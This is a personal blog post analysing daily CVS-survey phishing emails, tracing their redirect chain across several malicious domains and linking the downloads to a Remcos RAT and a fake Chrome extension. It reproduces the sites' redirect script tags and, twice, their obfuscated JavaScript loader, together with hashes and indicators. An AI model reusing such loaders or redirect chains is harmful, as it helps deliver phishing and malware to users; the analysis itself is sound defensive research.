# bikebikesally.github.io

## The bait

I got curious about all the spam gmail messages I started getting. They were all of the form:

---
Dear Client,

At CVS, we are constantly trying to improve our service and would like to hear your feedback on how we performed.

The survey is short and will only take 2 minutes to complete.

And Of Course there's a $90 promo reward to you After Finishing

Take survey [link]

We appreciate your partnership and collaboration.
---

The sender was some random gmail address, and the subject was random text. I get these daily. Yes, this was obviously malspam. But inquiring minds want to know: what kind of malspam?

## Linking to googleapis

The message is base64 encoded html. The link associated with "Take Survey" varies, but it always a
storage.googleapis.com URL. Here is an example link:

https://yiudyqxbfqyaozkyqghnicrletg.storage.googleapis[.]com/djiddrwqjusrzufsolztxavnmkreimiahqeds?zc5o5kz6k9lsmucntt5q5ml9fkh5ifnpp0m1d2xc1o46u59cj9d6szjfd2a8no340f4br00mdy29kkkkk

## Alltheservicesyouneed[.]com enters the chat

If you follow the link, it redirects to https://alltheservicesyouneed[.]com/0/0/0/7f3808fa1b0787f795a082f0219a9bdb/main361.
The number at the end of the path varies. And the alltheservicesyouneed[.]com link in turn redirects again. This number at the end often leads to the same redirection target, but not always. Is this some sort of load balancing mechanism? Or is this malspam-as-a-service, and they farm out the clicks to their various clients?

Here's some examples of the redirection targets I'm seeing. Note that the s2 query parameter varies, while the other parameters don't; more on that below.

 <script type="text/javascript">window.location.href="https://carpetwindow[.]com/s1=350159&s2=968909597&s3=2149&s4=1680&ow=&s10=888"</script>
<script type="text/javascript">window.location.href="https://h0zi.presentlinks[.]com/?kw=31&s2=969619992"</script>
<script type="text/javascript">window.location.href="https://narrationfile[.]info/?s1=350159&s2=969621543&s3=1782&s4=1710&ow=&s10=739"</script>
<script type="text/javascript">window.location.href="https://pressingplants[.]live/?s1=350159&s2=973046061&s3=1782&s4=1710&ow=&s10=739"</script>

Alltheservicesyouneed[.]com also sets a cookie that looks like this:
set-cookie: \n uid1782=970450640-20230422130903-694d38bc740b761384def7bee30d9868-0; domain=;\n expires=Mon, 22-May-2023 17:09:03 GMT; path=/; SameSite=None; Secure\n\n'

The uid+number seems to indicate where you are going to be forwarded to. Uid1782 is narrationfile[.]info, and, more recently, pressingplants[.]live. Uid31 is presentlinks[.]com. I think the first number in the cookie is an alltheservicesyouneed[.]com user counter/ID, and becomes the s2 query parameter in the redirection target. The second number is a timestamp. The last hex digit seems to be constant across GETs to the various redirection targets.

What if you send a GET to https://alltheservicesyouneed[.]com/0/0/0/7f3808fa1b0787f795a082f0219a9bdb/THINGTHATDOESNOTEXIST? You get back exactly the same kinds of redirection responses that you'd get with mainNNN. If you GET without a path, you get back a 404.

The domain alltheservicesyouneed[.]com resolves to 213.142.134.56. On VirusTotal, 12 security vendors have flagged
this as a phishing domain on VirusTotal: https://www.virustotal.com/gui/url/bd5201372b7b7f76efc7b348b67a534fc29ce6803e31e896f3700f5a49b3be88/detection. It was first flagged on October 1, 2022.

The domain alltheservicesyouneed[.].com also shows up in Cloudflare Radar's URL scanner:
https://radar.cloudflare.com/scan/9b888bd5-2bf7-44c1-9a54-7f66ff4cdc25/summary

That report was from March 23, 2023, using a path of https://alltheservicesyouneed.com/0/0/0/7f3808fa1b0787f795a082f0219a9bdb/main1355 and in this case resolving to
https://rectifierwands.info/7b92e5ca009db11cb3bea12734341018

The Shodan history for this IP is here: https://www.shodan.io/host/213.142.134.56/history. It has a different domain associated with the IP: youhavetomobeone[.]com. But if you WhoIs this new domain, it maps to a new IP: 92.249.24.2. No one has flagged this domain or IP as malicious on VirusTotal.

There are some interesting things that shows up on Shodan's history. One is a 8/6/2022 port 80 302 response. The response header has this: Location: https://ynscriblup[.]com/0/0/0/a95c4fd96574b4cc91e2ed5c610be687/gmail/. This turns out to be a GoDaddy parked domain. Another is a now-unexposed SMTP server, darkavai-sed.aerouser.com.Other times "aa.com" shows up in the SMTP server, as well as an old SSL certificate.

## carpetwindow[.].com

Let's check out the carpetwindow domain. It is pleased to meet my acquaintance and sends back this:
---
Date: Sat, 22 Apr 2023 17:32:05 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nset-cookie: PHPSESSID=ef61437a44f08fbe5a2d5bfdee60077e; path=/; secure\nexpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate\npragma: no-cache\nvary: Accept-Encoding,User-Agent,User-Agent\nx-frame-options: SAMEORIGIN\nx-xss-protection: 1; mode=block\nx-content-type-options: nosniff\nCF-Cache-Status: DYNAMIC\nReport-To: \n {"endpoints":[{"url":"https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=iXDutX6ArNMWp9hVjqHe7sHgH2Ed1SDiHNsBjs751vkdgEIrAVW8tuAJn88Oxk2btTT5gflHPR2BczxgEbAkarXBnJRjSN9EALaWCUkaXooTC3e3Dtadh39wK3%2F%2BEnWo9HhsyfQvyw%3D%3D"}],"group":"cf-nel","max_age":604800}\nNEL: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}\nServer: cloudflare\nCF-RAY: 7bbf9aa51d2d3a7c-FRA\nalt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400\n\n'
b'<script>window.history.pushState({},"", "/3090cd31948c37ec2ee2870f482da988");function _0x4eba(_0x4c03d2,_0xe4b087){const _0x3ccf2d=_0x3ccf();return _0x4eba=function(_0x4eba2c,_0x13dff7){_0x4eba2c=_0x4eba2c-0x14f;let _0x22a516=_0x3ccf2d[_0x4eba2c];return _0x22a516;},_0x4eba(_0x4c03d2,_0xe4b087);}(function(_0x5868e6,_0xfff814){const _0x61528b=_0x4eba,_0x48fdb1=_0x5868e6();while(!![]){try{const _0xbf18a1=-parseInt(_0x61528b(0x157))/0x1+-parseInt(_0x61528b(0x161))/0x2*(-parseInt(_0x61528b(0x15b))/0x3)+parseInt(_0x61528b(0x158))/0x4+parseInt(_0x61528b(0x159))/0x5*(-parseInt(_0x61528b(0x150))/0x6)+parseInt(_0x61528b(0x162))/0x7*(-parseInt(_0x61528b(0x14f))/0x8)+-parseInt(_0x61528b(0x160))/0x9+parseInt(_0x61528b(0x15a))/0xa*(parseInt(_0x61528b(0x152))/0xb);if(_0xbf18a1===_0xfff814)break;else _0x48fdb1[\'push\'](_0x48fdb1[\'shift\']());}catch(_0x1e48ac){_0x48fdb1[\'push\'](_0x48fdb1[\'shift\']());}}}(_0x3ccf,0xd0dc4),((()=>{let _0x1d24a4;function _0x317ee9(){const _0x34cb72=_0x4eba;_0x1d24a4=new XMLHttpRequest();if(!_0x1d24a4)return![];_0x1d24a4[_0x34cb72(0x156)]=_0x14768a,_0x1d24a4[_0x34cb72(0x15e)](_0x34cb72(0x151),\'?_ax=w\'),_0x1d24a4[_0x34cb72(0x154)](),console[_0x34cb72(0x15f)](_0x1d24a4[_0x34cb72(0x15d)]);}_0x317ee9();function _0x14768a(){const _0x3e6157=_0x4eba;_0x1d24a4[_0x3e6157(0x155)]===XMLHttpRequest[\'DONE\']&&(_0x1d24a4[\'status\']===0xc8?document[_0x3e6157(0x153)](_0x1d24a4[\'responseText\']):document[\'write\'](_0x3e6157(0x15c)));}})()));function _0x3ccf(){const _0x4e0fa3=[\'20iBklxX\',\'3RUyOcx\',\'404\\x20Not\\x20Found\',\'status\',\'open\',\'log\',\'4644783xMERJb\',\'1603608HBMLux\',\'851711lCRkkF\',\'8NjYPVK\',\'54906ougbtT\',\'GET\',\'9024521mDxWGt\',\'write\',\'send\',\'readyState\',\'onreadystatechange\',\'1107944AVyirZ\',\'853904xkZFwm\',\'30rgSiNk\'];_0x3ccf=function(){return _0x4e0fa3;};return _0x3ccf();}</script>
---

Yuck.

## Presentlinks[.]com

Presentlinks[.]com just redirects to Teh Google. I will have to try again later.

---
date: Sat, 22 Apr 2023 17:37:23 GMT\ncontent-type: text/html; charset=UTF-8\ntransfer-encoding: chunked\nlocation: https://google.com\nx-redir: true\nserver: swoole-http-server\nstrict-transport-security: max-age=15768000\n\n'
b'<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset="UTF-8" />\n        <meta http-equiv="refresh" content="0;url=\'https://google.com\'" />\n\n        <title>Redirecting to https://google.com</title>\n    </head>\n    <body>\n        Redirecting to <a href="https://google.com">https://google.com</a>.\n    </body>\n</html>
---

## narrationfile[.]info

Narrationfile[.]info also wants to do javascript-y thing:

---
<script>window.history.pushState({},"", "/332e8945f258e8dfc9b805e249e704f5");function _0x4eba(_0x4c03d2,_0xe4b087){const _0x3ccf2d=_0x3ccf();return _0x4eba=function(_0x4eba2c,_0x13dff7){_0x4eba2c=_0x4eba2c-0x14f;let _0x22a516=_0x3ccf2d[_0x4eba2c];return _0x22a516;},_0x4eba(_0x4c03d2,_0xe4b087);}(function(_0x5868e6,_0xfff814){const _0x61528b=_0x4eba,_0x48fdb1=_0x5868e6();while(!![]){try{const _0xbf18a1=-parseInt(_0x61528b(0x157))/0x1+-parseInt(_0x61528b(0x161))/0x2*(-parseInt(_0x61528b(0x15b))/0x3)+parseInt(_0x61528b(0x158))/0x4+parseInt(_0x61528b(0x159))/0x5*(-parseInt(_0x61528b(0x150))/0x6)+parseInt(_0x61528b(0x162))/0x7*(-parseInt(_0x61528b(0x14f))/0x8)+-parseInt(_0x61528b(0x160))/0x9+parseInt(_0x61528b(0x15a))/0xa*(parseInt(_0x61528b(0x152))/0xb);if(_0xbf18a1===_0xfff814)break;else _0x48fdb1[\'push\'](_0x48fdb1[\'shift\']());}catch(_0x1e48ac){_0x48fdb1[\'push\'](_0x48fdb1[\'shift\']());}}}(_0x3ccf,0xd0dc4),((()=>{let _0x1d24a4;function _0x317ee9(){const _0x34cb72=_0x4eba;_0x1d24a4=new XMLHttpRequest();if(!_0x1d24a4)return![];_0x1d24a4[_0x34cb72(0x156)]=_0x14768a,_0x1d24a4[_0x34cb72(0x15e)](_0x34cb72(0x151),\'?_ax=w\'),_0x1d24a4[_0x34cb72(0x154)](),console[_0x34cb72(0x15f)](_0x1d24a4[_0x34cb72(0x15d)]);}_0x317ee9();function _0x14768a(){const _0x3e6157=_0x4eba;_0x1d24a4[_0x3e6157(0x155)]===XMLHttpRequest[\'DONE\']&&(_0x1d24a4[\'status\']===0xc8?document[_0x3e6157(0x153)](_0x1d24a4[\'responseText\']):document[\'write\'](_0x3e6157(0x15c)));}})()));function _0x3ccf(){const _0x4e0fa3=[\'20iBklxX\',\'3RUyOcx\',\'404\\x20Not\\x20Found\',\'status\',\'open\',\'log\',\'4644783xMERJb\',\'1603608HBMLux\',\'851711lCRkkF\',\'8NjYPVK\',\'54906ougbtT\',\'GET\',\'9024521mDxWGt\',\'write\',\'send\',\'readyState\',\'onreadystatechange\',\'1107944AVyirZ\',\'853904xkZFwm\',\'30rgSiNk\'];_0x3ccf=function(){return _0x4e0fa3;};return _0x3ccf();}</script>
---

I am a javascript wimp, but I tried to figure out what it's doing anyway. To cut to the chase, it tries to stealthily redirect you to the path listed as the second parameter in the windows.history.pushState() with a ?_ax=w appended. But ... what about all the rest of the crap in the script? My best guess is that the coder wanted to do some clever string mutation stuff to hide the target URL from static analysis, but ran out of time and just pasted the unencoded path in there.
 
 ## pressingplants[.]live
 
OK, let's stuff https://pressingplants[.]live/?s1=350159&s2=973089695&s3=1782&s4=1710&ow=&s10=739 into any.run and see what it says: https://any.run/report/0166856189b109deccada50eb4e4ecd333a26fc46f8fc854284f68951c1389ba/30397507-eb51-42c5-a810-ef38fb4c3e03

So ... this does a *lot* of stuff. I mean, lots of adware crap, but a lot of other stuff too. I'll go over the stuff that popped out to me.

### SHA256	D015145D551ECD14916270EFAD773BBC9FD57FAD2228D2C24559F696C961D904, a .cab file that one commenter in VT linked to a Remcos RAT.

### SHA256	7C3A6A7D16AC44C3200F572A764BCE7D8FA84B9572DD028B15C59BDCCBC0A77D, a Chrome extension named Recovery.crx3. VT discussion at https://www.virustotal.com/gui/file/7c3a6a7d16ac44c3200f572a764bce7d8fa84b9572dd028b15c59bdccbc0a77d/relations.

Inside this .crx bundle is a PE SHA256 82AA3FD6A25CDA9E16689CFADEA175091BE010CECAE537E517F392E0BEF5BA0F, here called ChromeRecovery.exe. Here's the any.run report: https://app.any.run/tasks/120c958a-e84c-48ac-ab79-eae9608e740e. Unfortunately the sandbox times out before anything happens.

This file does show up in VT: https://www.virustotal.com/gui/file/82aa3fd6a25cda9e16689cfadea175091be010cecae537e517f392e0bef5ba0f/details, where it is known as gooupdate.dll.

To be continued ....

